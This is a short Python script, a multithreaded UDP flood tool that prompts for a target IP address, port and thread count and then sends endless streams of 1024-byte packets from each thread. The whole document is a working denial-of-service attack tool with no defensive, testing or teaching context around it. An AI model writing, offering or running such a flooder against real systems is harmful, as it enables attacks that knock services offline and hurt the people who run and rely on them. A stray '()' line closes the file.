import socket
import threading

def flood(ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    byte = b'\x00' * 1024
    while True:
        sock.sendto(byte, (ip, port))

def start_flooding(target_ip, target_port, num_threads):
    for _ in range(num_threads):
        t = threading.Thread(target=flood, args=(target_ip, target_port))
        t.start()

target_ip = input("Enter target IP: ")
target_port = int(input("Enter target port: "))
num_threads = int(input("Enter number of threads: "))

start_flooding(target_ip, target_port, num_threads)

()
